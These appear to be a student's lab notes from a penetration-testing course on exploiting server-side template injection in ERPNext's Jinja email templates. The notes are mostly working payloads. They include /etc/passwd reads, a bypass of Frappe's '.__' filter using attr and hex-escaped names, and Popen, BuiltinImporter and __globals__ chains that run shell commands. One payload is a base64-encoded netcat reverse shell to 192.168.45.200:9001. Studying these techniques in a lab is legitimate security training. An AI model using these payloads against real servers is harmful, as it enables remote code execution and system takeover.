# SSTI Vulnerability Discovery (JinJa)

From application administrator access, we’ll now try to attempt to obtain RCE.

Frappe uses the **Jinja** templating engine extensively, potentially suggesting Server-Side Template Injection (SSTI) as a potential vector for attack. 

## Templating Engines

Templating engines are used to render a static file dynamically based on the context of a request and user, allowing developers to centralize reusable content and separate view from MVC. 

Templating engines leverage **delimiters** to tell the engine where a template block starts and ends. This includes **expressions** (do something that results in a **value**, typically with `{{ <stuff> }}`) and **statements** (perform functionality like loops or if statements, usually start with `{% <stuff> %}`).

Templating engines commonly have additional syntax compared to the underlying language, for instance Jinja using`|` to pipe into the length filter. 

### Attacking template engines

If applications allow us to inject into templates, might be able to escape the sandbox of the templating engine and run system-level code. To discover SSTI, a common payload is `{{7*7}}` and looking for a response of 49, which indicates the payload is processed. 

Common exploitation payload (Python2):

```python
Python2:
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}

Python3:
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
```

The MRO attribute (of the string class) is used, which provides the order of inheritance for the object. In Python3, `str` inherits from the `object` class directly, hence `mro[2]` would lead to array out of bounds — we’ll use `mro[1]` instead

In Python2, `str` inherits from `basestring`, so we’ll get the `object` class when we perform `mro[2]`. 

Subclasses returns a list of objects that inherit from the `object` class, and the 40th index returns the `file` class, allowing us to read the `/etc/passwd` file as POC. 

## Vulnerability Discovery

ERPNext email templates use the Jinja templating engine, so we’ll look for that feature in the application. We’ll search and go to “Email Template List”, which allows us to view and create email templates in the application. Creating a new template lets us provide the name, subject and response, and we’ll put the SSTI payload into each of them. 

In the top left, we’ll go to Menu —> email to send an email based on the templates. When we select our template, the number 49 is found in the message and subject fields, meaning the SSTI works. Capturing our request with Burp Proxy, we see that a request is made to the endpoint `get_email_template`and the server responds as such.

![Untitled](SSTI%20Vulnerability%20Discovery%20(JinJa)%20e92e8dc67dda47649432e2958334538e/Untitled.png)

If we try to place `{{''.__class__}}` as the template, however, the server responds with “Illegal Template”. 

Tracing back the `get_email_template`, it looks like the error is being thrown by the `frappe.render_template` function. 

```python
@frappe.whitelist()
def get_email_template(template_name, doc):
	'''Returns the processed HTML of a email template with the given doc'''
	if isinstance(doc, string_types):
		doc = json.loads(doc)

	email_template = frappe.get_doc("Email Template", template_name)
	return {"subject" : frappe.render_template(email_template.subject, doc),
			"message" : frappe.render_template(email_template.response, doc)}
```

Tracing back to the `render_template` function in the file [`jinja.py`](http://jinja.py) (or by using a breakpoint), we find that as part of the filtering process, if `.__` is found in the template, it is thrown as an `Illegal Template`. As such, we’ll need to bypass this filter. 

```python
def render_template(template, context, is_path=None, safe_render=True):
	'''Render a template using Jinja

	:param template: path or HTML containing the jinja template
	:param context: dict of properties to pass to the template
	:param is_path: (optional) assert that the `template` parameter is a path
	:param safe_render: (optional) prevent server side scripting via jinja templating
	'''

	from frappe import get_traceback, throw
	from jinja2 import TemplateError

	if not template:
		return ""

	# if it ends with .html then its a freaking path, not html
	if (is_path
		or template.startswith("templates/")
		or (template.endswith('.html') and '\n' not in template)):
		return get_jenv().get_template(template).render(context)
	else:
		if safe_render and ".__" in template:
			throw("Illegal template")
		try:
			return get_jenv().from_string(template).render(context)
		except TemplateError:
			throw(title="Jinja Template Error", msg="<pre>{template}</pre><pre>{tb}</pre>".format(template=template, tb=get_traceback()))
```

### Extra Mile 8.5.2.3

*Discover another location where ERPNext uses the render function to execute user-provided
code*

- Another area where SSTI might be possible is in the `get_terms_and_conditions` function of the `terms_and_conditions`. Similar to above, it is also a whitelisted function that directly puts the results of a `frappe.get_doc` function into the `render_template`. In the UI, this is triggered by creating a job listing and rendering the tempers and conditions.

```python
@frappe.whitelist()
def get_terms_and_conditions(template_name, doc):
	if isinstance(doc, string_types):
		doc = json.loads(doc)

	terms_and_conditions = frappe.get_doc("Terms and Conditions", template_name)
	
	if terms_and_conditions.terms:
		return frappe.render_template(terms_and_conditions.terms, doc)
```

## Filter Evasion

Source: [Template Designer Documentation — Jinja Documentation (3.1.x) (palletsprojects.com)](https://jinja.palletsprojects.com/en/3.1.x/templates/)

One interesting feature of Jinja is called **filters**. They act as modifiers and can be applied to a variable using a pipe `|` symbol. These [filters](https://jinja.palletsprojects.com/en/3.1.x/templates/#builtin-filters) provide different functionalities to the different objects, for instance `attr` or `urlencode`. 

- In particular, the `attr` object gets the attribute of an object, similar to what `.` in Python would be doing. This allows us to retrieve specific properties of a Python object.

Since we just need to avoid having the `.__` string, we can rewrite our payload to avoid using it directly. Remember: The distinction between having `{%` as a statement and `{{` as an operation — we use `{%` to declare our variables and `{{` to reference them

```python
{% set string = "" %}
{% set class = "__class__" %}
{% set mro = "__mro__" %}
{% set subclasses = "__subclasses__" %}
{% string|attr(class)% }
```

### Extra Mile 8.5.3.2

*Creating string variables of the attributes we need to access is only one option to bypass the SSTI filter. If the developers replace the filter from “.__**” to “__**”, our payload would not work any longer. Using the Jinja documentation, find another method to exploit the filter that does not set the string variables for the attributes directly in the template. For this Extra Mile, the template should only contain the following expression: “string|attr(class)”.*

Here are some working payloads:

Additional reference: [Jinja2 SSTI | HackTricks | HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti)

Ascii encoding: [https://en.wikipedia.org/wiki/ASCII#ASCII_printable_code_chart](https://en.wikipedia.org/wiki/ASCII#ASCII_printable_code_chart)

```python
Breaking up __ into single _
{% set class = "_" + "_" + "class" + "_" + "_" %}
Ascii encoding:
{% set class = "\x5f\x5fclass\x5f\x5f" %}
```

## RCE

When we display the MRO, we get the following result. As such, we’ll want to access the index 1. 

```json
{"message":
	{"message":"<div></div><div></div><div></div><div></div><div>(<class 'str'>, <class 'object'>)</div>",
	"subject":"testing"
	}
}
```

Since Jinja syntax does not work with `[` characters after a filter, we’ll save the response to the MRO attribute as a variable and then access the first index.

```python
{% set mro = string|attr(class)|attr(mro) %}
{{mro[1]}}
```

We can then output all the subclasses with the subclasses() attribute, and then look through the classes for potential attack vectors. We’ll take this and paste it onto a text file and replace the `,` with newlines, allowing us to easily index our wanted class. 

In one of them, we find the `subprocess.Popen` class on index 391 (line 392), which we can use to execute code remotely.  

```python
{{mro[1]|attr(subclasses)()}}
```

We can now use this to gain a reverse shell. Here are some sample payloads.

Base64-encoded netcat reverse shell: 

```python
{% set string = "test" %}
{% set class = "\x5f\x5fclass\x5f\x5f" %}
{% set mro = "\x5f\x5fmro\x5f\x5f" %}
{% set subclasses = "\x5f\x5fsubclasses\x5f\x5f" %}
{% set mro = string|attr(class)|attr(mro) %}
{% set subclasses = mro[1]|attr(subclasses)() %}
{% set subprocess = subclasses[391] %}
{% set shellcode = "echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxOTIuMTY4LjQ1LjIwMCA5MDAxID4vdG1wL2Y= | base64 -d  | sh" %}
{{subprocess(shellcode, shell=True)}}
```

Ascii Encoding of special characters: 

```python
{% set shellcode = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\x3e\x261|nc 192.168.45.200 9001 \x3e/tmp/f" %}
```

### Exercise 8.6.1.1

*Find other classes that you can use to obtain sensitive information about the system or
execute commands against the system*

The `BuiltinImporter` class can be used to import modules, including os or subprocess to gain RCE or file read. 

```python
{% set string = "test" %}
{% set class_template = "\x5f\x5fclass\x5f\x5f" %}
{% set mro_template = "\x5f\x5fmro\x5f\x5f" %}
{% set subclasses_template = "\x5f\x5fsubclasses\x5f\x5f" %}
{% set mro = string|attr(class_template)|attr(mro_template) %}
{% set subclasses = mro[1]|attr(subclasses_template)() %}
{% set builtins = subclasses[67]%}
{% set subprocess= builtins|attr("load_module")("subprocess") %}
{{subprocess.run("ls -la", shell=True, stdout=subprocess.PIPE).stdout}}
```

### Extra Mile 8.6.2.2

*Using the Python and Jinja documentation, make changes to the template that will allow the
output to display in the response.*

If we have the subprocess parent module (rather than just the Popen class), we’ll be able to pipe our stdout back into our object to gain full RCE. We’ll do that by going through the `sys` module, which has the attribute `sys.modules` that allows us to access many common Python modules. Alternatively, we could access the `os` module, which also provides us with RCE. 

```python
{% set init_template = "__init__" %}
{% set global_template = "__globals__" %}
{% set attr = self|attr(init_template)|attr(global_template) %}
{% set sys = attr.sys %}
{% set modules = sys|attr("modules") %}
{% set subprocess = modules.subprocess %}
{{subprocess.run("cat /etc/passwd", shell=True, stdout=subprocess.PIPE).stdout}}
```